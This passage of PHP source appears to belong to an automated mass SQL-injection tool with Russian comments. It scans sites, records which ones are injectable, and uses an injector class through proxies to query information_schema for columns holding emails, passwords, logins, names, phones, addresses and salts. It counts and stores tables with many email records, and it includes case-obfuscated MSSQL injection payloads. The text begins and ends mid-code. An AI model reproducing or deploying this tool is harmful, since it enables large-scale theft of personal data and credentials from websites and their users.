								preg_match_all("~<(.*?)>(.*?)<\/(.*?)>~",$content,$arr);
								
								
								$this->d($arr,'multi HEAD');
								
								
								
								if(isset($arr[2][1]))
								{	
									$file_priv = 0;
									$mysqlbd = 0;
									
									if(@$arr[2][7]=='Y' or @$arr[2][7]=='y')
									{
										
										$mysqlbd = 1;
										$file_priv = 1;
									}
									
									
									if(@$arr[2][7]=='N' or @$arr[2][7]=='n')
									{
										
										$mysqlbd = 1;
										$file_priv = 0;
									}
									
									
									
									////////////////////////
									
									flush();
									
									$this->d($arr,'arr_all');
									$arr[2][6] =  substr($arr[2][6],0,30);
									
									
									if(preg_match("/,/",$arr[2][8]))
									{
										
										$this->d('zapytua GOOD !!');
										$zap = true;
									}else{
										if($arr[2][8]=='' or $arr[2][8]==0){
											
											$zap = true;
										}
										
									}
									
									$lll = strlen($arr[2][8]);
									
									
									if(strstr($arr[0][1],'404 - Categoría no encontrada') or strstr($arr[0][2],'de visitar esta página'))
									{	
											$this->d('404 - Categoría no encontrada ');
											if(trim($url) !='')fwrite($fh, trim($url)."\r\n");
											
									}	
								
									
									if(!empty($arr[2][3]) AND $urltic['host'] !='' and $arr[2][6] !='' and !empty($urltic['host']) and $arr[2][8] !='Gateway time-out' AND 	$lll < 55 and $arr[2][8] !='An error has occurred while processing your request.' AND $zap==TRUE and $arr[2][8] !='Während der Anfrage ist ein Fehler aufgetreten!')
									{
										
										$arr[2][6] = str_replace(array("'","\""), "", $arr[2][6]);
										$arr[2][8] = str_replace(array("'","\""), "", $arr[2][8]);

										
										
										
										
										//$this->d($arr[2],'arr_all zapis v BD');
										
										if($this->Post->query('UPDATE `posts` SET 
										`prohod` = 5,
										`gurl`="'.$arr[2][1].'",
										`tables`="'.mysql_real_escape_string($arr[2][8]).'",
										`status`=3,
										`work`="'.$arr[2][6].'",
										`sposob`="'.mysql_real_escape_string($arr[2][5]).'",
										`method`="'.mysql_real_escape_string($arr[2][2]).'",
										`column`="'.$arr[2][4].'",
										`mysqlbd`="'.$mysqlbd.'",
										`file_priv`="'.$file_priv.'",
										`version`="'.mysql_real_escape_string($arr[2][3]).'",
										`tic`='.$this->getcy($urltic['host']).',
										`sleep` ="'.mysql_real_escape_string($arr[2][9]).'"
										WHERE `domen` ="'.$domen.'" or `domen` ="'.$domen2.'" or url = "'.$url2.'"')){
											
											$this->d($domen,'update TRUE');
										}else{
											$this->d($domen,'update FALSE !');
											
											$this->d('UPDATE `posts` SET 
										`prohod` = 5,
										`gurl`="'.$arr[2][1].'",
										`tables`="'.mysql_real_escape_string($arr[2][8]).'",
										`status`=3,
										`work`="'.$arr[2][6].'",
										`sposob`="'.mysql_real_escape_string($arr[2][5]).'",
										`method`="'.mysql_real_escape_string($arr[2][2]).'",
										`column`="'.$arr[2][4].'",
										`mysqlbd`="'.$mysqlbd.'",
										`file_priv`="'.$file_priv.'",
										`version`="'.mysql_real_escape_string($arr[2][3]).'",
										`tic`='.$this->getcy($urltic['host']).',
										`sleep` ="'.mysql_real_escape_string($arr[2][9]).'"
										WHERE `domen` ="'.$domen.'" or `domen` ="'.$domen2.'" or url = "'.$url2.'"');
										}
										
										
										
									}
								}else
								{
									$this->d($url['posts']['url'].":::PUSTO",$url2);
									
								}			
							}
							
						


						
							
							
						if(preg_match("/Internal Server Error/i",$arr[0][1]) or $arr[2][0]=='500 Internal Server Error' or $arr[2][1]=='Internal Server Error'){
							
							
							$this->d(' Internal Server Error OTVET');
							
							

						}else
						{
							
							
							if($this->Post->query('UPDATE  `posts` SET  `prohod` = 5 WHERE  `domen` ="'.$domen.'" or `domen` ="'.$domen2.'" or url = "'.$url2.'"'))
							{
								$this->d('good prohod update');
							}else{
								$this->d('FALSE prohod update');
								
							}
							
							$this->d('UPDATE  `posts` SET  `prohod` = 5 WHERE  `domen` ="'.$domen.'" or `domen` ="'.$domen2.'" or url = "'.$url2.'"');
						}	
							
							


							curl_multi_remove_handle($cmh, $ch);

							curl_close($ch);

						//	exit;
							if(count($newservv)==0)$newservv = $serv;		
							
							if(count($urls)>0)
							{			
								
								echo 'zapusk dopolnitelno<br>';	
								
								$kkk = count($newservv);
								$lll = mt_rand(1,$kkk);
								$urserv = $newservv[$lll];
								$urs_shell = $urserv;
								
								
								$urs_one = array_shift($urls);
								if(!empty($urs_shell))
								{
									
									
									$urlllll = str_replace('http://', '', trim($urs_one['posts']['url'])); 
									$ch = $this->create_streem($urs_shell,$urlllll.'::'.trim($urs_one['posts']['http']));	
									$tasks[$urs_one['posts']['url'].':::'.$urs_one['posts']['id']] = $ch;
									curl_multi_add_handle($cmh, $ch);
								}				
							}
							
						}
					}
					while ($mrc == CURLM_CALL_MULTI_PERFORM);
				}
			}
			
			curl_multi_close($cmh);

			

			$this->stop();
			
			die();

		}
	
	
	
	

	function getcountmail(){//количество мыл в таблицах у --MYSQL--
		
		
		if($this->search_email==false){
			
			return false;
		}
		
		
		ignore_user_abort(true);
		set_time_limit(0);
		//UPDATE  `multis` SET  `get` ='3' WHERE  `get` ='1'
		
		//$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=2 AND `prohod`<5 limit 50");
		//$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=0");

		//if(count($urls)!=0)
		//{
		//$this->logs("stepTree STOP - stepOne zapushen: ".intval($file[0][0]['count']),__FUNCTION__);
		//die("stepTree STOP - stepOne zapushen: ".intval($file[0][0]['count']));
		//}
		
		
		
		$r = rand(1,100);
		
		$this->logs("stepTree zapushen - № $r",__FUNCTION__);
		
		
		$this->timeStart = $this->start('stepTree',1);
		
		$squles = $this->Post->query("SELECT * FROM  `posts` WHERE `getmail`=0 AND `version` LIKE  '%5.%' limit 15");
		

		$count = count($squles);
		
		if($count==0)
		{
			$this->stop();
			echo '$count==0 stepTree';
			
			$this->passwordAllsqule();
			
			die('netu nische po shagu tree');
		}
		
		$i=1;
		
		$this->d($squles );
		
		
		foreach ($squles as $squle)
		{
			//$this->d($squle['posts']['id'],'id');
			
			$this->workup();
			
			$this->Post->query("UPDATE `posts` SET `getmail`=1  WHERE `id`=".$squle['posts']['id']);
			
			
			
			$fieldcount = $this->Post->query("SELECT * FROM  `fileds` WHERE  `post_id` =".$squle['posts']['id']);
			
			
			
			if(count($fieldcount)>0)
			{
				$this->d(count($fieldcount),'count($fieldcount) > 0');
				$this->logs(count($fieldcount).' - count($fieldcount) >0:'.$r,__FUNCTION__);
				continue;
			}
			
			$this->logs($squle['posts']['id'].'- squle_id:'.$r,__FUNCTION__);
			
			
			$squle['Post'] = $squle['posts'];
			
			if(strlen($squle['Post']['sleep']) > 2)
			{
				$set = $squle['Post']['sleep'];
				$this->d($set,'set');
			}else
			{
				$set = false;
			}
			
			
			
			$this->mysqlInj = new $this->Injector();
			
			$this->proxyCheck();
			
			$this->mysqlInj ->inject($squle['Post']['header'].'::'.$squle['Post']['gurl'],$squle,$set);
			

			$data = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%mail%').') AND ( `DATA_TYPE`=char('.$this->charcher('char').') OR `DATA_TYPE`=char('.$this->charcher('varchar').') OR `DATA_TYPE`=char('.$this->charcher('text').'))');
			
			$this->d($data,'data');
			
			//exit;
			if(count($data)>0)
			{
				$this->workup();
				$url = parse_url($squle['Post']['url']);
				$ip = gethostbyname($url['host']);

				foreach ($data as $mail)
				{
					
					
					//$this->d($mail,'$mail');
					
					
					$mailcount = $this->mysqlInj->mysqlGetCountInsert($mail['TABLE_SCHEMA'],$mail['TABLE_NAME'],'WHERE `'.$mail['COLUMN_NAME'].'` LIKE char('.$this->charcher('%@%').')');
					
					
					$this->d($mailcount,'$mailcount');
					
					$this->logs($mailcount.' - '.$mail['COLUMN_NAME'].' $mailcount:'.$r,__FUNCTION__);
					
					flush();

					if(intval($mailcount)!==0)
					{
						if($mailcount > 500)://меньше 500 не будем искать
						
						$fieldcount = $this->Post->query("SELECT * FROM  `fileds` WHERE  `post_id` ='".$squle['posts']['id']."' AND `count` = {$mailcount}");
						
						$this->d($fieldcount,'fieldcount');
						$this->d($ip,'ip');
						$this->d($mail['TABLE_SCHEMA'],'TABLE_SCHEMA');
						$this->d($mail['TABLE_NAME'],'TABLE_NAME');
						$this->d($squle['Post']['id'],'id');
						flush();
						
						
						//OR $fieldcount == '' OR $fieldcount == '0' or count($fieldcount) == 0
						if(count($fieldcount) == 0 )
						//чтобы одни и теже таблицы по нескольку раз не записывать
						{	
							$this->d('!!!test!!!');
							$this->data['Filed']['id'] = 0;
							$this->data['Filed']['ipbase']  = $ip.':'.$mail['TABLE_SCHEMA'].':'.$mail['TABLE_NAME'].':'.$mail['COLUMN_NAME'];
							$this->data['Filed']['post_id']   = $squle['Post']['id'];
							$this->data['Filed']['table']	= $mail['TABLE_NAME'];
							$this->data['Filed']['label']	= $mail['COLUMN_NAME'];
							$this->data['Filed']['count']	= intval($mailcount);
							$this->data['Filed']['site']	= $squle['Post']['url'];
							$this->data['Filed']['typedb']	= "mysql";
							
							if($this->Filed->save($this->data)){
								echo 'OK<br>';
							}
						}
						endif;
					}	
				}
			}	

			//$this->d($this->mysqlInj);		
		}
		
		$this->stop();
		$this->logs("stepTree ostanovlen № $r",__FUNCTION__);
		
		die('okay');
		
	}
	
	function getcountmailMSSQL(){//количество мыл в таблицах ++MSSQL++
		
		ignore_user_abort(true);
		set_time_limit(0);
		
		
		//$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=2 AND `prohod`<5 limit 50");
		//$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=0");

		//if(count($urls)!=0)
		//{
		//$this->logs("stepTree STOP - stepOne zapushen: ".intval($file[0][0]['count']),__FUNCTION__);
		//die("stepTree STOP - stepOne zapushen: ".intval($file[0][0]['count']));
		//}
		
		
		
		$r = rand(1,100);
		
		$this->logs("stepTree zapushen - № $r",__FUNCTION__);
		
		
		$this->timeStart = $this->start('getcountmailMSSQL',1);
		
		$squles = $this->Post->query("SELECT * FROM  `posts` WHERE `getmail`=0 AND `version` LIKE  'm%' limit 5");
		

		$count = count($squles);
		
		if($count==0)
		{
			$this->stop();
			echo '$count==0 getcountmailMSSQL';
			
			
			
			die('netu nische po shagu tree');
		}
		
		$i=1;
		
		$this->d($squles );
		//exit;
		
		foreach ($squles as $squle)
		{
			//$this->d($squle['posts']['id'],'id');
			
			$this->workup();
			
			$this->Post->query("UPDATE `posts` SET `getmail`=1  WHERE `id`=".$squle['posts']['id']);
			
			
			
			$fieldcount = $this->Post->query("SELECT * FROM  `fileds` WHERE  `post_id` =".$squle['posts']['id']);
			
			
			
			if(count($fieldcount)>0)
			{
				$this->d(count($fieldcount),'count($fieldcount) > 0');
				$this->logs(count($fieldcount).' - count($fieldcount) >0:'.$r,__FUNCTION__);
				continue;
			}
			
			$this->logs($squle['posts']['id'].'- squle_id:'.$r,__FUNCTION__);
			
			
			$squle['Post'] = $squle['posts'];
			
			if(strlen($squle['Post']['sleep']) > 2)
			{
				$set = $squle['Post']['sleep'];
				$this->d($set,'set');
			}else
			{
				$set = false;
			}
			
			
			
			$this->mysqlInj = new $this->Injector();
			
			$this->proxyCheck();
			
			$this->mysqlInj ->inject($squle['Post']['header'].'::'.$squle['Post']['gurl'],$squle,$set);
			
			if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
			{
				$this->mysqlInj->mssql =true;
				
				$this->d('MSSQL!');
				
			}
			
			
			$data = $this->mysqlInj ->mssqlGetLikeEmail();
			
			//exit;
			

			
			$this->d($data,'data T');
			
			//exit;
			if(count($data)>0)
			{
				$this->workup();
				$url = parse_url($squle['Post']['url']);
				$ip = gethostbyname($url['host']);

				foreach ($data as $key => $value)
				{
					
					
					//$this->d($mail,'$mail');
					$mail2 = explode(':::',$value);
					$mail['TABLE_SCHEMA'] = $mail2[0];
					$mail['TABLE_NAME'] = $mail2[1];
					$mail['COLUMN_NAME'] = $mail2[2];
					
					$mailcount = $this->mysqlInj->mssqlGetCount($mail['TABLE_SCHEMA'],$mail['TABLE_NAME']);
					
					
					$this->d($mailcount,'$mailcount');
					//exit;
					$this->logs($mailcount.' - '.$mail['COLUMN_NAME'].' $mailcount:'.$r,__FUNCTION__);
					
					flush();

					if(intval($mailcount)!==0)
					{
						if($mailcount > 6000)://меньше тыщи не будем искать
						
						$fieldcount = $this->Post->query("SELECT * FROM  `fileds` WHERE  `post_id` ='".$squle['posts']['id']."' AND `count` = {$mailcount}");
						
						$this->d($fieldcount,'fieldcount');
						$this->d($ip,'ip');
						$this->d($mail['TABLE_SCHEMA'],'TABLE_SCHEMA');
						$this->d($mail['TABLE_NAME'],'TABLE_NAME');
						$this->d($squle['Post']['id'],'id');
						flush();
						
						
						//OR $fieldcount == '' OR $fieldcount == '0' or count($fieldcount) == 0
						if(count($fieldcount) == 0 )
						//чтобы одни и теже таблицы по нескольку раз не записывать
						{	
							$this->d('!!!test!!!');
							$this->data['Filed']['id'] = 0;
							$this->data['Filed']['ipbase']  = $ip.':'.$mail['TABLE_SCHEMA'].':'.$mail['TABLE_NAME'].':'.$mail['COLUMN_NAME'];
							$this->data['Filed']['post_id']   = $squle['Post']['id'];
							$this->data['Filed']['table']	= $mail['TABLE_NAME'];
							$this->data['Filed']['label']	= $mail['COLUMN_NAME'];
							$this->data['Filed']['count']	= intval($mailcount);
							$this->data['Filed']['site']	= $squle['Post']['url'];
							$this->data['Filed']['typedb']	= "mssql";
							if($this->Filed->save($this->data)){
								echo 'OK<br>';
							}
						}
						endif;
					}	
				}
			}	

			//$this->d($this->mysqlInj);		
		}
		
		$this->stop();
		$this->logs("stepTree ostanovlen № $r",__FUNCTION__);
		
		die('okay');
		
	}
	
	
	
	function passwordAllsqule(){//поиск колонок с pass ++MSSQL++ and --MYSQL--

		$poles = $this->Filed->query("SELECT * FROM  `fileds` WHERE `password`='' limit 10");
		
		if(count($poles)>0){
			
			$this->timeStart = $this->start('passwordAllsqule',3);
		}else{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		$this->logs("stepFor zapushen - № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$this->workup();
            
            $password=':';
            
			$this->FindPasswordInSqule($pole['fileds']['id']);
		}
		$this->stop();
		$this->logs("stepFor ostanovlen № $r",__FUNCTION__);
		die('fse');
	}
	
	function FindPasswordInSqule($idf){//поиск колонок с pass - дочерняя функция
		
		
		$pass = $this->passwords;
		
		
		$field = $this->Filed->findbyid($idf);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field['Filed']['post_id']);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field['Filed']['ipbase']);
		
		$this->d($bd,'$bd');
		//exit;

		$password=':';
		
		
		
		
		foreach ($pass as $pps)
		{

			$this->workup();
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			
			}
			
			$this->d($mysql,'$mysql'); 
			
			//exit;
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'].':';
				
				continue;
			}
			
		}
        
        $this->Filed->query('UPDATE  `fileds` SET  `password` =  "'.$password.'" WHERE  `id` ='.$idf);
        
        $this->d('UPDATE  `fileds` SET  `password` =  "'.$password.'" WHERE  `id` ='.$idf);
		
		$this->d($password);

		
	}
	
	
	function loginAllsqule(){//поиск колонок с именами ++MSSQL++ and --MYSQL--

		$poles = $this->Filed->query("SELECT * FROM  `fileds` WHERE `login`='' limit 20");
		
		if(count($poles)>0){
			
			$this->timeStart = $this->start('loginAllsqule',1);
		}else{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		$this->logs("stepFor zapushen - № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$this->workup();
            $password=':';
            
            
			$this->FindLoginInSqule($pole['fileds']['id']);
		}
		$this->stop();
		$this->logs("stepFor ostanovlen № $r",__FUNCTION__);
		die('fse');
	}
	
	function FindLoginInSqule($idf){//поиск колонок с pass - дочерняя функция
		
		$pass = $this->logins;
		
		$field = $this->Filed->findbyid($idf);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field['Filed']['post_id']);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field['Filed']['ipbase']);
		
		$this->d($bd,'$bd');
		//exit;

		$password=':';
		
		
		
		
		foreach ($pass as $pps)
		{

			$this->workup();
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			
			}
			
			$this->d($mysql,'$mysql'); 
			
			//exit;
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'];
				
				continue;
			}
			
		}
		
		$this->d($password);
        $this->Filed->query('UPDATE  `fileds` SET  `login` =  "'.$password.'" WHERE  `id` ='.$idf);
		
	}
	
	
	
	function nameAllsqule(){//поиск колонок с именами ++MSSQL++ and --MYSQL--

		$poles = $this->Filed->query("SELECT * FROM  `fileds` WHERE `name`='' limit 20");
		
		if(count($poles)>0){
			
			$this->timeStart = $this->start('nameAllsqule',1);
		}else{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		$this->logs("stepFor zapushen - № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$this->workup();
            $password=':';
           
			$this->FindNameInSqule($pole['fileds']['id']);
		}
		$this->stop();
		$this->logs("stepFor ostanovlen № $r",__FUNCTION__);
		die('fse');
	}
	
	function FindNameInSqule($idf){//поиск колонок с pass - дочерняя функция
		
        
        $pass = $this->names;
        
		
		
		$field = $this->Filed->findbyid($idf);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field['Filed']['post_id']);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field['Filed']['ipbase']);
		
		$this->d($bd,'$bd');
		//exit;

		$password=':';
		
		
		
		
		foreach ($pass as $pps)
		{

			$this->workup();
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			
			}
			
			$this->d($mysql,'$mysql'); 
			
			//exit;
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'];
				
				continue;
			}
			
		}
		
		$this->d($password);
    $this->Filed->query('UPDATE  `fileds` SET  `name` =  "'.$password.'" WHERE  `id` ='.$idf);
		
	}
	
	
	function phoneAllsqule(){//поиск колонок с телефонами ++MSSQL++ and --MYSQL--

		$poles = $this->Filed->query("SELECT * FROM  `fileds` WHERE `phone`='' limit 20");
		
		if(count($poles)>0){
			
			$this->timeStart = $this->start('phoneAllsqule',1);
		}else{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		$this->logs("stepFor zapushen - № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$this->workup();
			$this->FindPhoneInSqule($pole['fileds']['id']);
		}
		$this->stop();
		$this->logs("stepFor ostanovlen № $r",__FUNCTION__);
		die('fse');
	}
	
	function FindPhoneInSqule($idf){//поиск колонок с pass - дочерняя функция
		
        
       $pass =  $this->phones;
		
		
		$field = $this->Filed->findbyid($idf);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field['Filed']['post_id']);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field['Filed']['ipbase']);
		
		$this->d($bd,'$bd');
		//exit;

		$password=':';
		
		
		
		
		foreach ($pass as $pps)
		{

			$this->workup();
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			
			}
			
			$this->d($mysql,'$mysql'); 
			
			//exit;
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'];
				
				continue;
			}
			
		}
		
		$this->d($password);

		$this->Filed->query('UPDATE  `fileds` SET  `phone` =  "'.$password.'" WHERE  `id` ='.$idf);
	}
	
	
    function AdressAllsqule(){//поиск колонок с адресами ++MSSQL++ and --MYSQL--

		$poles = $this->Filed->query("SELECT * FROM  `fileds` WHERE `adress`='' limit 10");
		
		if(count($poles)>0){
			
			$this->timeStart = $this->start('addresssearch',1);
		}else{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		$this->logs("stepFor zapushen - № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$this->workup();
			$this->FindAdressInSqule($pole['fileds']['id']);
		}
		$this->stop();
		$this->logs("stepFor ostanovlen № $r",__FUNCTION__);
		die('fse');
	}
	
	function FindAdressInSqule($idf){//поиск колонок с pass - дочерняя функция
		
		$pass = $this->adress;
		
		$field = $this->Filed->findbyid($idf);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field['Filed']['post_id']);
		
		$this->mysqlInj = new $this->Injector();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->proxyCheck();
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			//$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field['Filed']['ipbase']);
		
		$this->d($bd,'$bd');
		//exit;

		$password=':';
		
		
		
		
		foreach ($pass as $pps)
		{

			$this->workup();
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			
			
			}
			
			$this->d($mysql,'$mysql'); 
			
			//exit;
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'];
				
				continue;
			}
			
		}
		
		$this->d($password);

		$this->Filed->query('UPDATE  `fileds` SET  `adress` =  "'.$password.'" WHERE  `id` ='.$idf);
	}
	
    
	
	function saltAllsqule(){//поиск колонок с солью ++MSSQL++ and --MYSQL--

		$poles = $this->Filed->query("SELECT * FROM  `fileds` WHERE `salt` is null limit 20");
		
		$this->d($poles,'$poles');
		
		if(count($poles)>0){
			
			$this->timeStart = $this->start('soltAllsqule',1);
		}else{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		$this->logs("stepFor zapushen - № $r",__FUNCTION__);
		
		
		
		foreach ($poles as $pole){
			$this->workup();
			$this->FindSaltInSqule($pole['fileds']['id']);
		}
		$this->stop();
		$this->logs("stepFor ostanovlen № $r",__FUNCTION__);
		die('fse');
	}
	
	function FindSaltInSqule($idf){ //поиск соли - дочерняя функция
		
		$pass = array('salt');
		
		$field = $this->Filed->findbyid($idf);
		
		$squle = $this->Filed->query("SELECT * FROM  `posts` WHERE `id` = ".$field['Filed']['post_id']);
		
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}
		
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
